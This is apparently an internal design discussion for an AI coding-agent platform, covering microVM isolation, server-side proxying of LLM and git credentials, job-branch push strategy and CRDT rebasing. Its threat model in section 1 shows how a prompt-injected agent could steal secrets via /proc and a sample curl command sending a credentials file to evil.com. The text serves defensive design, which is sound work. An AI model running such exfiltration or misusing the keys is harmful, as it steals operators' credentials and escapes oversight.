# Architecture Discussion — Agent Isolation, Push Strategy, CRDT-Git Convergence

_Date: 2026-02-13_

---

## 1. Where Does the Agent Loop Run?

### Current Spec: Agent Loop Runs INSIDE the Worker Process (Inside the MicroVM)

The current design makes **g5d a single binary** that contains everything:

```
┌─────────────────────────────────────────────────────────────┐
│  g5d process  (INSIDE Kata VM / worktree process)           │
│                                                             │
│  ┌───────────┐  ┌───────────┐  ┌──────────────────────┐    │
│  │ WorkerOrch│──│ AgentLoop │──│ LlmProviderManager   │────── HTTPS → OpenAI/Anthropic
│  │           │  │ (ReAct)   │  │ (holds API keys)     │    │
│  │           │  ├───────────┤  └──────────────────────┘    │
│  │           │  │ ToolExec  │                               │
│  │           │  │ ├ terminal│──── PTY shell (same process)  │
│  │           │  │ ├ file_ops│──── local filesystem           │
│  │           │  │ ├ git_ops │──── git (SCM creds in memory)  │
│  │           │  │ └ lifecycle──── transition_task_state       │
│  └───────────┘  └───────────┘                               │
│                                                             │
│  ┌───────────┐  ┌───────────┐                               │
│  │ CRDT Peer │──│ WebSocket │──────────────── g5-api         │
│  └───────────┘  └───────────┘                               │
└─────────────────────────────────────────────────────────────┘
```

**This means:** A sufficiently clever/malicious agent prompt injection could, in theory:

1. Run `cat /proc/self/maps` or `/proc/self/environ` in the terminal to find memory-mapped secrets (though the spec explicitly avoids putting secrets in env vars to block exactly this)
2. Ask to `run_in_terminal("curl https://evil.com/exfil --data @/tmp/.g5-credentials")` to steal SCM tokens
3. Read the g5d process memory via `/proc/self/mem` if it can figure out the offsets
4. Use the LLM API keys (which are in the same process memory) to make rogue API calls

The mitigations in the current design:
- SCM creds use git credential helper files with restricted permissions, not env vars
- LLM API keys are passed in-memory only (never disk/env)
- Destructive git commands are blocked
- Terminal output is logged and auditable

But these are all **defense-in-depth** — they slow down a sophisticated attacker, they don't prevent it architecturally.

### The Supervisor/MicroVM Split Alternative

The question is: should we split the process boundary?

```
┌─────────────────────────────────────────────────────────────┐
│  SUPERVISOR  (outside VM, holds credentials)                │
│                                                             │
│  ┌───────────────────┐  ┌──────────────────────┐            │
│  │ LlmProviderManager│  │ GitPushProxy         │            │
│  │ (API keys here)   │  │ (SCM creds here)     │            │
│  └────────┬──────────┘  └──────────┬───────────┘            │
│           │ gRPC/unix socket       │                         │
├───────────┼────────────────────────┼─────────────────────────┤
│  MICROVM  │ (no credentials)       │                         │
│           ▼                        ▼                         │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐               │
│  │ AgentLoop │  │ ToolExec  │  │ CRDT Peer │               │
│  │ (ReAct)   │  │ (terminal,│  │ (→ g5-api)│               │
│  │           │  │  file I/O)│  │           │               │
│  └───────────┘  └───────────┘  └───────────┘               │
│                                                             │
│  Network: ONLY loopback (to supervisor) + g5-api IP         │
│  No DNS, no outbound routing                                │
└─────────────────────────────────────────────────────────────┘
```

**Pros:**
- Credentials never enter the VM at all — even a root exploit can't find them
- LLM calls go through the supervisor, which can audit/rate-limit/filter
- Git push goes through the supervisor, which holds SCM tokens and does the actual `git push`
- The agent's terminal commands have ZERO network access (or access only to the supervisor socket)

**Cons:**
- Added latency: every LLM call and git push traverses a socket boundary (~1-2ms, negligible)
- More complex deployment: two processes to manage instead of one
- Supervisor is a new attack surface (but a much smaller one — it only accepts structured gRPC calls)
- Some tools need network (e.g., `cargo fetch`, `npm install`) — those need a controlled proxy or pre-built images

### Assessment

The current single-process model is fine for trusted deployment (our own agents, our own models, audited prompts). The supervisor split becomes essential when we run **untrusted agents** — community models, user-supplied system prompts, third-party plugins. That's the "restricted worker" tier discussed previously.

**Recommendation:** Keep one binary but **add a `WorkerIsolationLevel` enum** that controls whether credentials are held in-process or proxied:

```rust
pub enum WorkerIsolationLevel {
    /// Trusted: credentials in-process, direct internet access
    /// For: our own agents, audited models, internal development
    Trusted,
    /// Restricted: credentials proxied through g5-api, no direct internet
    /// For: untrusted models, community plugins, sandboxed experiments
    Restricted,
}
```

For `Restricted`, the LLM provider is always `HttpProvider` pointed at `g5-api/internal/llm/proxy`, and the COLLECT phase is server-side (CRDT-only, no git push from worker).

---

## 2. Git Push Strategy — Task Branches vs. Base Branch

### Current Spec Says: Push to `task/<task-id>` Branch

From `worker.semlift.md` line 209 and 243:

```
CLONE+PATCH: git checkout -b task/<task-id> <base-commit>
...
COLLECT: git push origin task/<task-id>
```

Each task pushes to its **own namespaced branch**, not the job's base branch. There should be no push conflicts on task branches because only one worker owns each task. The push failure scenario in the spec is for edge cases like:
- Worker crashes and is replaced — new worker resumes on the same task branch (stale ref)
- Checkpoint commits from a prior attempt that are already on the remote

### But Wait: Your Point About Base Branch

You raised "[we are] pushing to the base git branch of the job on commit, and we could fall out of date." This suggests a different model where multiple tasks in a job push to a **shared branch** — which IS how draft commits work:

From `g5-api.semlift.md` [lines 178-182](generation/.semlift/specs/g5/g5-api.semlift.md#L178):

```
POST /api/v1/drafts/:draftId/commit:
  SELECT head_commit FROM workspace_branches WHERE id = $branch_id FOR UPDATE;
  IF head_commit != expectedHeadCommit → ROLLBACK, return 409 DRAFT_CONFLICT;
  // Extract dirty files from Yjs → git add + commit + push
  IF git push fails (non-fast-forward) → ROLLBACK, return 409;
  UPDATE workspace_branches SET head_commit = $new_sha;
```

So there are **two distinct commit paths**:

| Path | Who | Target | Conflict? |
|------|-----|--------|-----------|
| **Task COLLECT** | Worker (g5d) | `task/<task-id>` branch | Rare (single owner) |
| **Draft Commit** | Server (g5-api) | Workspace branch (e.g., `main`) | Yes — CAS guard, 409 DRAFT_CONFLICT |

When a job completes (all tasks done), someone needs to **merge** all the `task/*` branches into the workspace branch. This is where conflicts happen.

### Missing Piece: Job Branch Integration

The specs don't have a clear **job integration step** — how do `task/task-1`, `task/task-2`, ..., `task/task-N` branches merge back into the workspace branch? Options:

**Option A: Per-task rebase onto head (current implicit model)**
- Each task's COLLECT pushes to `task/<task-id>`
- After task completes, g5-api rebases `task/<task-id>` onto current `HEAD` of workspace branch
- If no conflicts → fast-forward workspace branch to the rebased commit
- If conflicts → mark task as `needs_rebase`, re-assign to a worker
- **Pro:** Simple mental model, each task's diff is clean
- **Con:** Sequential bottleneck if many tasks complete simultaneously

**Option B: CRDT-first, git-second (stronger model)**
- While tasks execute, all mutations flow through CRDT to g5-api
- g5-api's authoritative Yjs document is the merge point — CRDT merges are conflict-free by definition
- When it's time to create a git commit (job completion, user-triggered), g5-api materializes the CRDT state onto the workspace branch
- This is the `POST /api/v1/drafts/:draftId/commit` path above
- **Pro:** No branch merging at all. CRDT IS the merge.
- **Con:** The task branches (`task/<task-id>`) become audit trails, not primary integration channels

**Option C: Agent-driven rebase (what you suggested)**
- Push failure returns a tool error, not a hard failure
- Agent gets: "Push rejected: remote has diverged. Pull, rebase, resolve conflicts."
- Agent can `git pull --rebase`, fix conflicts, and retry `transition_task_state("complete")`
- **Pro:** Agent can handle semantic conflicts (not just textual ones)
- **Con:** Only works if agent has git credentials (doesn't fit restricted model)

### Recommendation

**Option B is the right default for jobs** — the CRDT layer already handles concurrent edits, that's literally what it's for. Task branches are audit artifacts, not integration channels. The actual commit to the workspace branch is done by g5-api when the draft is committed (CAS-guarded).

**Option C should be the push failure recovery** for the rare case where a task branch push actually fails (resumed tasks, checkpoint races):

```
COLLECT git push fails:
  1. If non-fast-forward → return ToolResult::error(
       "Push rejected. Remote task branch has diverged (likely from a prior checkpoint). 
        Run: git pull --rebase origin task/{id} && resolve any conflicts, then retry 
        transition_task_state('complete')."
     )
  2. If network/auth error → retry 3x with backoff, then ToolResult::error(
       "Push failed after retries: {reason}. Task work is preserved in CRDT draft."
     )
  3. Agent stays in EXECUTE phase — can diagnose and retry
```

For **restricted workers** (no git push), COLLECT becomes:
1. Flush CRDT deltas to g5-api (this is already happening continuously)
2. Report `transition_task_state("complete")` via internal API
3. g5-api does: materialize CRDT → git commit → git push (server-side)
4. Worker never needs push capability at all

---

## 3. When the Base Branch Moves Ahead of Our CRDT Edit

### The Scenario

```
Time 0:  base_commit = abc123, draft forks here
         workspace branch: abc123

Time 1:  Human pushes commit def456 to workspace branch
         workspace branch: abc123 → def456
         
         Agent is still editing against abc123 via CRDT
         Agent doesn't know about def456

Time 2:  Agent completes task. CRDT state reflects changes against abc123.
         But workspace branch HEAD is now def456.
         
         What happens?
```

### Current Spec Behavior

The spec doesn't explicitly address this. Here's what each layer does:

**CRDT layer:** The Yjs document tracks file-level changes as a delta against `base_commit`. It doesn't know about git branches. It's purely "these files have these contents, here are the operations that got us there." When человек pushes `def456`, the CRDT doesn't see it — it only sees human edits that come through the CRDT protocol (browser editor). A raw git push bypasses the CRDT entirely.

**Draft commit endpoint:** Uses CAS guard:
```
IF head_commit != expectedHeadCommit → 409 DRAFT_CONFLICT
```
So if the draft was forked from `abc123` but HEAD is now `def456`, the commit will return 409.

**Task COLLECT:** Pushes to `task/<task-id>` which was branched from `abc123`. No conflict because this branch is independent.

### The Gap

There's a missing reconciliation step: **when the workspace branch advances beyond the draft's base_commit, the CRDT state needs to be rebased.**

### Proposed Behavior: Transparent Rebase on No-Conflict, Flag on Conflict

```
Draft Commit Flow (enhanced):

1. Client calls POST /api/v1/drafts/:draftId/commit { expectedHeadCommit: "abc123" }

2. Server checks: workspace_branches.head_commit = "def456" ≠ "abc123"
   → Branch has advanced since draft fork point

3. Server performs 3-way merge:
   a. Base: abc123 (draft fork point)
   b. Ours: CRDT document state (materialized files)  
   c. Theirs: def456 (current HEAD)
   
4. If no textual conflicts:
   → Create merge commit: parents = [def456, task-branch-tip]
   → Or rebase: replay CRDT changes on top of def456
   → Update head_commit, return 200 with new SHA
   → Emit WebSocket event: "draft rebased transparently"
   
5. If textual conflicts:
   → Return 409 DRAFT_CONFLICT with:
     {
       "conflictType": "merge_conflict",
       "conflicting_files": ["src/auth/mod.rs", "Cargo.toml"],
       "base_commit": "abc123",
       "head_commit": "def456",
       "message": "Workspace branch advanced. 2 files have conflicts."
     }
   → Draft is NOT destroyed — it remains active
   → Human (or agent) must resolve:
     Option A: Rebase draft interactively (new CRDT-aware rebase tool)
     Option B: Force-overwrite (take draft version, discard branch changes)
     Option C: Abandon draft
```

### For Jobs with Task Branches

When multiple tasks complete and their branches need integration:

```
Job Integration Flow:

1. All tasks complete → task/task-1, task/task-2, ..., task/task-N exist

2. g5-api's job completion handler:
   a. For each task branch (in dependency order):
      - 3-way merge: base=task_base_commit, ours=workspace_head, theirs=task_branch
      - No conflict → fast-forward or merge commit → advance workspace_head
      - Conflict → mark job as "needs_resolution", notify user
      
   b. If ALL tasks merge cleanly → job status = "completed"
   c. If ANY task conflicts → job status = "needs_resolution"
      - Conflicting branches preserved for manual resolution
      - Non-conflicting branches already merged

3. Resolution options:
   - Human merges manually via G5 UI (CRDT-aware conflict editor)
   - Re-run conflicting tasks with updated base_commit
   - Agent-assisted merge (new "resolve" job type)
```

### Real-Time Base Branch Tracking (Optional Enhancement)

Instead of discovering divergence at commit time, detect it earlier:

```
Worker receives WebSocket event: "branch_advanced"
  → { branch_id, old_head: "abc123", new_head: "def456", changed_files: [...] }

Worker checks: do any changed_files overlap with CRDT-tracked files?
  → No overlap: transparent. Log: "Base branch advanced, no conflicts with draft."
  → Overlap detected: warn agent. Inject inbox message:
    "Warning: base branch advanced. Files you've modified were also changed: 
     src/auth/mod.rs (modified in commit def456). Consider reading the updated 
     version before completing."
```

This gives the agent a chance to adapt DURING execution, not just fail at commit time.

---

## 4. Putting It All Together — Restricted Worker + CRDT-First Integration

The cleanest architecture for autonomy-without-credentials:

```
┌──────────────────────────────────────────────────────────────────┐
│ g5-api (AUTHORITY)                                               │
│                                                                  │
│  ┌─────────────┐  ┌──────────────┐  ┌────────────────────────┐  │
│  │ Yjs CRDT    │  │ Git Repo     │  │ LLM Proxy              │  │
│  │ Authority   │  │ (SCM creds)  │  │ (API keys)             │  │
│  │             │  │              │  │                        │  │
│  │ merge()     │  │ commit()     │  │ POST /internal/llm/    │  │
│  │ conflict()  │  │ push()       │  │ chat → OpenAI/Anthropic│  │
│  └──────┬──────┘  └───────┬──────┘  └───────────┬────────────┘  │
│         │                 │                      │               │
│    WebSocket          server-side            gRPC/HTTP           │
│    (y-protocol)       COLLECT                proxy               │
│         │                 │                      │               │
├─────────┼─────────────────┼──────────────────────┼───────────────┤
│         │                 │                      │               │
│  ┌──────▼──────┐          │               ┌──────▼──────┐       │
│  │ CRDT Peer   │          │               │ HttpProvider │       │
│  │ (local doc) │          │               │ → g5-api     │       │
│  └──────┬──────┘          │               └──────┬──────┘       │
│         │                 │                      │               │
│  RESTRICTED WORKER (Kata VM, no internet, no credentials)        │
│                                                                  │
│  ┌───────────┐  ┌───────────┐                                   │
│  │ AgentLoop │──│ ToolExec  │                                   │
│  │ (ReAct)   │  │ (terminal,│  Network: g5-api IP ONLY           │
│  │           │  │  file I/O,│  No DNS, no outbound routing       │
│  │           │  │  git local│  No SCM creds, no LLM keys         │
│  └───────────┘  └───────────┘                                   │
│                                                                  │
│  COLLECT = flush CRDT + report complete (no git push)            │
│  g5-api does: materialize CRDT → git commit → git push           │
│  Integration: CRDT merge (conflict-free) or 3-way git merge      │
└──────────────────────────────────────────────────────────────────┘
```

**Data exfiltration prevention:**
- No DNS → can't resolve external hostnames
- No outbound routing → can't reach external IPs
- No credentials → even if they find a way out, nothing authenticates
- LLM calls proxied → g5-api can filter/audit request content
- All file mutations tracked via CRDT → complete audit log

**What the agent CAN still do:**
- Read/write files (local filesystem → CRDT delta → g5-api)
- Run terminal commands (build, test, lint — all local)
- Call LLMs (proxied through g5-api)
- Signal task completion (transition_task_state → CRDT flush → report)
- Read git history (local repo, read-only)
- Create local git commits (for checkpoints — no push)

**What the agent CANNOT do:**
- Push to git remote (no SCM credentials)
- Call external APIs (no network routing)
- Exfiltrate data via LLM (g5-api proxy can inspect prompts)
- Read credentials from memory (they were never in the VM)
- Establish reverse shells (no inbound connections, no outbound routing)

---

## 5. Decisions (2026-02-13, Round 2)

### Decision 5.1: LLM Credentials Stay Server-Side (Default)

**Status:** DECIDED

The default model is: **workers never hold LLM API keys.** All LLM inference is proxied through g5-api. Workers use `HttpProvider` pointed at `POST /api/internal/llm/chat`. Direct-to-provider mode (worker holds keys) is a future opt-in for latency-sensitive or self-hosted deployments.

**Rationale:**
- Eliminates credential exfiltration risk from agent terminal
- Centralizes rate limiting, cost tracking, and provider failover
- Workers become stateless compute — no secrets at all (SCM or LLM)
- Aligns with restricted worker model (§4 above)

### Decision 5.2: Task Branches Push to Job Branch (Linear History)

**Status:** DECIDED

Each task pushes its commits onto the **job branch** (e.g., `job/<job-id>`), not an independent `task/<task-id>` branch. The job branch is a **linearly serializable sequence of commits** — tasks are serialized at push time in DAG dependency order.

```
Job branch: job/job-123

  base ← task-A commit ← task-B commit ← task-C commit ← ...
                                          ↑
                                    (task-C rebases onto task-B's result)
```

**Flow:**
1. Task starts: `git checkout -b task/<task-id> job/<job-id>` (fork from current job branch tip)
2. Task works: local commits on `task/<task-id>`
3. Task COLLECT:
   a. `git fetch origin job/<job-id>` — get current job branch tip
   b. `git rebase origin/job/<job-id>` — rebase task commits onto tip
   c. If no conflicts: `git push origin task/<task-id>:job/<job-id>` — fast-forward the job branch
   d. If push rejected (another task pushed between fetch and push): retry from (a), up to 3 times
   e. If rebase conflicts: return `ToolResult::error(...)` — agent resolves

**Why linear:**
- Clean `git log` for the entire job — easy to audit, review, revert individual tasks
- No merge commits cluttering history
- g5-api can trivially detect job progress by reading the job branch log
- Each task's changes are a clean set of commits on the linear history

**What changes in the scheduler:**
- `TaskAssignment.branch_name` becomes `job/<job-id>` (the shared job branch), not `task/<task-id>`
- g5-api creates the job branch (`job/<job-id>` from `base_commit`) when the job starts
- Tasks still use local `task/<task-id>` branches for isolation during EXECUTE, but push to the job branch in COLLECT
- The scheduler ensures tasks with dependencies don't start until their deps complete (already true), which naturally serializes the push order for dependent tasks
- Independent tasks (no dep relationship) may race to push — the retry-rebase loop handles this

### Decision 5.3: Push Failures Return ToolResult::error (Agent Stays Alive)

**Status:** DECIDED

When COLLECT's git push fails, the agent loop stays in EXECUTE phase and gets a tool error it can act on:

```
Push rejected (non-fast-forward):
  → ToolResult::error(
      "Push to job/job-123 rejected — another task pushed ahead of you. 
       Run: git fetch origin job/job-123 && git rebase origin/job/job-123
       Then resolve any conflicts and retry transition_task_state('complete')."
    )

Push failed (network/auth, after 3 internal retries):
  → ToolResult::error(
      "Push failed after 3 retries: {reason}. 
       Your work is preserved locally and in CRDT. 
       Retry transition_task_state('complete') when ready."
    )

Rebase conflicts:
  → ToolResult::error(
      "Rebase onto job/job-123 produced conflicts in: src/auth/mod.rs, Cargo.toml.
       Resolve conflicts (git add, git rebase --continue), then retry 
       transition_task_state('complete')."
    )
```

**What changes:** `collect_phase()` in `task_lifecycle.rs` returns `ToolResult::error` (soft error) instead of `G5Error` (hard error). The agent can diagnose, fix, and retry.

### Decision 5.4: CRDT Always Tracks Branch Tip (Live Rebase)

**Status:** DECIDED

The CRDT draft always applies against the **current tip** of its tracking branch. When the tracking branch advances (e.g., another task pushes to the job branch, or a human pushes to the workspace branch), the CRDT state is immediately rebased.

**Flow:**

```
Time 0:  tracking_branch HEAD = abc123
         CRDT draft forks from abc123
         Draft state: { "src/lib.rs": <edits against abc123> }

Time 1:  tracking_branch advances to def456 (new commit pushed)
         g5-api detects HEAD change (via webhook or poll)
         
Time 2:  g5-api performs CRDT rebase:
         a. Compute file-level diff: abc123 → def456 (which files changed?)
         b. For each CRDT-tracked file NOT touched in abc123→def456:
            → No action needed, CRDT edits still apply cleanly
         c. For each CRDT-tracked file ALSO changed in abc123→def456:
            → Attempt 3-way merge: base=abc123, ours=CRDT state, theirs=def456
            → If merge succeeds: update CRDT document to reflect merged content,
              advance draft base to def456
            → If merge conflicts: mark file as CONFLICTED in draft metadata
         d. For files changed in abc123→def456 but NOT in CRDT:
            → Transparent: CRDT doesn't track them, they're just part of the new base
         e. Update draft.base_commit = def456

Time 3:  Draft is now based on def456. All connected clients (workers, browsers)
         receive the rebase as a CRDT update.
```

**Conflict UX:**

When a file has a merge conflict that can't be auto-resolved:

1. **In the browser editor:** Drop the user into a diff view showing:
   - Left: their CRDT edit (what they/the agent wrote)
   - Right: the incoming branch change
   - Conflict markers highlighted
   - User resolves inline (edits go through CRDT as normal)

2. **Notification:** If the conflict was caused by the user's own edit (they pushed to the branch from outside G5), show:
   > "Your push to `main` conflicts with your draft edit in `src/lib.rs`. [Open diff to resolve →]"
   
   If caused by another user or an agent:
   > "Branch `main` advanced. `src/lib.rs` has a conflict with your draft. [Open diff to resolve →]"

3. **For workers/agents:** The worker receives a WebSocket event:
   ```json
   {
     "type": "draft_rebase",
     "base_commit": "def456",
     "rebased_files": ["src/config.rs"],
     "conflicted_files": ["src/lib.rs"],
     "message": "Tracking branch advanced. 1 file rebased cleanly, 1 file has conflicts."
   }
   ```
   This is injected into the agent's inbox (same mechanism as human messages). The agent can then read the conflicted file, see conflict markers, and resolve them.

4. **Draft status:** The draft gains a `conflicts: Vec<ConflictedFile>` field. While conflicts exist, `POST /api/v1/drafts/:draftId/commit` returns 409 with `"reason": "unresolved_conflicts"`. The draft cannot be committed until all conflicts are resolved.

**What this means for the CRDT layer:**
- `DraftSession` gains: `tracking_branch_id`, `base_commit` (mutable — advances on rebase)
- g5-api's CRDT authority needs a `rebase_draft()` method
- The rebase uses git's 3-way merge algorithm (via `git2`) on file content, then updates the Yjs document
- Yjs updates from rebase are broadcast to all connected peers like any other edit

---

## 6. Spec Change Plan

Concrete edits to make to the spec files. **Not yet applied.**

### 6.1: Add `POST /api/internal/llm/chat` to g5-api

**Target file:** `.semlift/specs/g5/g5-api/routes/internal.semlift.md`

**Add new endpoint (Endpoint 10):**

```markdown
### Endpoint 10: LLM Proxy — `POST /api/internal/llm/chat`

Proxies LLM chat completion requests from workers through g5-api. The server
holds all LLM API keys — workers never receive them. This is the default (and 
only) LLM path for workers.

**Request DTO:**

  ```rust
  #[derive(Debug, Deserialize)]
  #[serde(rename_all = "camelCase")]
  pub struct LlmProxyChatRequest {
      pub messages: Vec<LlmProxyMessage>,
      #[serde(default)]
      pub tools: Vec<ToolDefinition>,
      #[serde(default = "default_temperature")]
      pub temperature: f64,
      #[serde(skip_serializing_if = "Option::is_none")]
      pub max_tokens: Option<u32>,
      /// Provider override. If None, uses workspace default.
      #[serde(skip_serializing_if = "Option::is_none")]
      pub provider: Option<String>,
      /// Model override. If None, uses workspace default.
      #[serde(skip_serializing_if = "Option::is_none")]
      pub model: Option<String>,
      /// Task ID for cost attribution.
      pub task_id: String,
      /// Session ID for cost attribution.
      pub session_id: String,
  }

  #[derive(Debug, Deserialize, Serialize)]
  #[serde(rename_all = "camelCase")]
  pub struct LlmProxyMessage {
      pub role: String,
      pub content: String,
      #[serde(skip_serializing_if = "Option::is_none")]
      pub tool_calls: Option<Vec<serde_json::Value>>,
      #[serde(skip_serializing_if = "Option::is_none")]
      pub tool_results: Option<Vec<serde_json::Value>>,
  }

  fn default_temperature() -> f64 { 0.0 }
  ```

**Response:** SSE stream (`text/event-stream`), forwarding the upstream 
provider's streaming response. Each SSE event contains a JSON chunk matching
the provider's native format (OpenAI delta format normalized).

**Final SSE event:** `data: {"done": true, "usage": {"prompt_tokens": N, 
"completion_tokens": N, "total_tokens": N, "cost_usd": 0.05}}`

The handler automatically records usage via `spend_service.record_usage()` 
after the stream completes — workers don't need to call `/api/internal/usage` 
separately for proxied requests.

**Handler logic:**
1. Extract `AuthContext::Service` (service token auth)
2. Resolve provider config: workspace settings → org defaults → platform defaults
3. Look up API key from server-side credential store (NOT from request)
4. Construct upstream request using the resolved provider's SDK
5. Stream response back to worker as SSE
6. On stream completion: record usage (tokens, cost, model, provider) to DB
7. On upstream error: return structured error with provider/model/status info
```

**Also update:**
- Router registration: add `.route("/llm/chat", post(llm_proxy_chat))` 
- Endpoint count: 9 → 10 in descriptions
- Checklist: add LLM proxy items
- Dependencies: add LLM provider config (new service or config section)

### 6.2: Add LLM Provider Config to g5-api

**Target file:** `.semlift/specs/g5/g5-api/config.semlift.md`

**Add section:**

```markdown
### LLM Provider Configuration

g5-api holds all LLM API keys server-side. Workers proxy through 
`POST /api/internal/llm/chat`.

```rust
#[derive(Debug, Clone, Deserialize)]
pub struct LlmConfig {
    /// Default provider for agent tasks.
    pub default_provider: String,        // "openai" | "anthropic" | "openrouter"
    /// Default model for agent tasks.  
    pub default_model: String,           // "claude-sonnet-4-20250514"
    /// Provider configurations keyed by provider name.
    pub providers: HashMap<String, LlmProviderServerConfig>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct LlmProviderServerConfig {
    /// Provider type: "openai", "anthropic", "openrouter", "http"
    pub provider_type: String,
    /// API key (loaded from env var or secret store, never in config file)
    #[serde(skip)]
    pub api_key: Option<secrecy::SecretString>,
    /// API key env var name (e.g., "OPENAI_API_KEY")
    pub api_key_env: Option<String>,
    /// Base URL override (for self-hosted, vLLM, etc.)
    pub base_url: Option<String>,
    /// Organization ID (OpenAI)
    pub organization_id: Option<String>,
    /// Max requests per minute (rate limiting at proxy level)
    pub max_rpm: Option<u32>,
    /// Max tokens per minute
    pub max_tpm: Option<u32>,
}
```

API keys are loaded at startup from environment variables specified in 
`api_key_env`. They are NEVER serialized, logged, or sent to workers.
```

### 6.3: Update Worker Spec — Remove Encrypted Secrets for LLM Keys

**Target file:** `.semlift/specs/g5/g5d/worker.semlift.md`

**Changes:**

1. **TaskAssignment section (line ~137-145):** Remove `encrypted_secrets` from the default flow. Add note:
   > `encrypted_secrets` is reserved for future use (direct-to-provider mode). 
   > In the default server-proxied mode, workers receive no LLM credentials.
   > The worker's `LlmProviderManager` is configured with a single `HttpProvider` 
   > whose `base_url` points to `{api_url}/api/internal/llm/chat`.

2. **Step 1b "Decrypt and populate resolved secrets" (line ~192-197):** Conditional:
   > If `encrypted_secrets` is `null` (default server-proxied mode): 
   > configure `LlmProviderManager` with `HttpProvider { base_url: "{api_url}/api/internal/llm/chat" }`.
   > The service token (already held by the worker from registration) authenticates proxy requests.
   >
   > If `encrypted_secrets` is present (direct-to-provider opt-in):
   > decrypt and pass API keys to `LlmProviderManager` for direct provider construction.

3. **Security properties section (~line 462-476):** Add:
   > **Default mode (server-proxied):** Workers hold zero credentials — 
   > no SCM tokens, no LLM API keys. All LLM calls proxy through g5-api.
   > Workers authenticate to the proxy using their service token from registration.

### 6.4: Update Worker Spec — Job Branch Linear Push

**Target file:** `.semlift/specs/g5/g5d/worker.semlift.md`

**Changes:**

1. **CLONE+PATCH phase (line ~209):** Change from:
   > `git checkout -b task/<task-id> <base-commit>`
   
   To:
   > 1. `git fetch origin job/<job-id>` — fetch current job branch tip
   > 2. `git checkout -b task/<task-id> origin/job/<job-id>` — fork from job branch tip
   > 
   > The task works on a local `task/<task-id>` branch for isolation.
   > The job branch `job/<job-id>` is the shared linear history target.

2. **COLLECT phase (line ~237-244):** Replace with:
   > **Phase 4: COLLECT**
   > 
   > On task completion (`transition_task_state → complete`):
   > 
   > 1. Materialize full CRDT draft to disk — ensure all pending deltas are written
   > 2. `git add -A && git commit -m "<structured message>"`
   > 3. Rebase onto job branch tip:
   >    a. `git fetch origin job/<job-id>`
   >    b. `git rebase origin/job/<job-id>`
   >    c. If rebase conflicts → return `ToolResult::error` (agent resolves)
   > 4. Push to job branch:
   >    a. `git push origin HEAD:job/<job-id>`
   >    b. If rejected (race with another task) → retry from step 3, up to 3 times
   >    c. If still rejected → return `ToolResult::error` (agent retries manually)
   > 5. Report results to g5-api (with commit SHA)
   > 
   > The job branch is a **linearly serializable** sequence of commits.
   > No merge commits. Each task's work appears as a clean run of commits.

3. **Error table (line ~270-276):** Update COLLECT row:
   > | COLLECT | Rebase conflicts | Return `ToolResult::error`, agent resolves conflicts and retries |
   > | COLLECT | Push rejected (race) | Retry rebase+push 3 times, then `ToolResult::error` |
   > | COLLECT | Push failed (network) | Retry 3 times with backoff, then `ToolResult::error` |

4. **TaskAssignment JSON example (line ~134):** Change `"branch": "task/task-456"` to `"branch": "job/job-123"` (the job branch, not the task branch).

### 6.5: Update Task Lifecycle Spec — ToolResult::error on Push Failure

**Target file:** `.semlift/specs/g5/g5d/tools/task_lifecycle.semlift.md`

**Changes:**

1. **`collect_phase()` step 4 "Git push" (around line 127-130):** Replace:
   > On push failure: logs a warning via `warn!` and returns `G5Error::GitError`
   
   With:
   > **Rebase + Push sequence:**
   > 1. `git fetch origin job/<job-id>`
   > 2. `git rebase origin/job/<job-id>` 
   >    - If conflicts: return `Ok(ToolResult::error("Rebase conflicts in: {files}. Resolve and retry."))`
   > 3. `git push origin HEAD:job/<job-id>`
   >    - If rejected (non-fast-forward): retry from step 1, up to 3 times
   >    - If still rejected: return `Ok(ToolResult::error("Push still rejected after 3 rebase attempts. Retry manually."))`
   >    - If network/auth failure: retry push 3 times with backoff, then return `Ok(ToolResult::error("Push failed: {reason}"))`
   > 4. On success: return the commit SHA
   > 
   > **Critical:** All push failures return `ToolResult::error` (soft error), NOT `G5Error`. 
   > The agent loop stays in EXECUTE phase and can diagnose/fix/retry.

### 6.6: Update CRDT Spec — Track Branch Tip, Live Rebase

**Target file:** `.semlift/specs/g5/g5d/crdt.semlift.md` (worker side)
**Target file:** `.semlift/specs/g5/g5-api/crdt/authority.semlift.md` (server side)

**Changes to CRDT authority (g5-api side):**

1. **Add `DraftSession` fields:**
   > ```rust
   > pub struct DraftSession {
   >     // ... existing fields ...
   >     pub tracking_branch_id: Uuid,
   >     pub base_commit: String,        // mutable — advances on rebase
   >     pub conflicts: Vec<ConflictedFile>,
   > }
   > 
   > pub struct ConflictedFile {
   >     pub path: String,
   >     pub ours_content: String,       // CRDT version
   >     pub theirs_content: String,     // branch version
   >     pub base_content: String,       // common ancestor version
   >     pub detected_at: DateTime<Utc>,
   > }
   > ```

2. **Add `rebase_draft()` method:**
   > `async fn rebase_draft(&self, draft_id: Uuid, new_head: &str) -> Result<RebaseResult, G5Error>`
   > 
   > Called when the tracking branch advances past `draft.base_commit`:
   > 1. Compute diff: `base_commit → new_head` (files changed)
   > 2. For each changed file that overlaps with CRDT-tracked files:
   >    a. 3-way merge via `git2::MergeFile`: base=old base, ours=CRDT, theirs=new_head
   >    b. If clean merge: update Yjs document with merged content
   >    c. If conflict: add to `draft.conflicts`, mark file in Yjs with conflict markers
   > 3. Advance `draft.base_commit = new_head`
   > 4. Broadcast Yjs update to all connected peers
   > 5. Return `RebaseResult { rebased_files, conflicted_files }`

3. **Add branch watcher:**
   > g5-api watches tracked branches for HEAD changes (via git webhook or periodic poll).
   > When HEAD advances past a draft's `base_commit`, call `rebase_draft()`.

4. **Block commit while conflicts exist:**
   > `POST /api/v1/drafts/:draftId/commit`: if `draft.conflicts.len() > 0`, 
   > return 409 `{ "error": "unresolved_conflicts", "files": [...] }`.

**Changes to CRDT peer (g5d/worker side):**

5. **Handle `draft_rebase` WebSocket event:**
   > When worker receives `draft_rebase` event:
   > - Apply Yjs update (CRDT document now reflects rebased state)
   > - Re-materialize changed files to local filesystem
   > - If `conflicted_files` is non-empty: inject inbox message to agent:
   >   "Tracking branch advanced. {N} files rebased cleanly.
   >    {M} files have conflicts: {paths}. Read and resolve before completing."

**Changes to browser/frontend (notification):**

6. **Conflict notification UX:**
   > When `draft_rebase` event arrives with `conflicted_files`:
   > - Show notification: "Branch `{branch}` advanced. {N} files have conflicts with your draft."
   > - Click → opens diff view for first conflicted file
   > - If the push that caused the conflict was by the same user:
   >   "Your push to `{branch}` conflicts with your draft edit in `{file}`."
   > - Diff view: left=CRDT version, right=branch version, inline conflict markers

### 6.7: Update g5-api Scheduler — Create Job Branch

**Target file:** `.semlift/specs/g5/g5-api/scheduler/mod.semlift.md`

**Add:**
